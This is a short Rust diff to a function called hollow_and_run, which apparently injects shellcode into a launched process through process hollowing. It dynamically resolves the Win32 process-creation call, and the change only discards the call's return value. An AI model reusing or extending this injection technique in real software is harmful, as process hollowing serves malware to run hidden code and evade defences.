@@ -26,7 +26,7 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
     let function = rco_utils::construct_win32_function!(function; [PCSTR, PSTR, *const SECURITY_ATTRIBUTES, *const SECURITY_ATTRIBUTES, bool, PROCESS_CREATION_FLAGS, *const i32, PCSTR, *const STARTUPINFOA, *mut PROCESS_INFORMATION]; [BOOL]);
     let lp_command_line = PSTR::from_raw(format!("{target_process}\0").as_mut_ptr());
     unsafe {
-        function(
+        let _ = function(
             PCSTR::null(),
             lp_command_line,
             ptr::null(),
@@ -37,7 +37,7 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
             PCSTR::null(),
             &STARTUPINFOA::default(),
             &mut process_information,
-        )
+        );
     };
 
     // Get location of Ntdll.dll
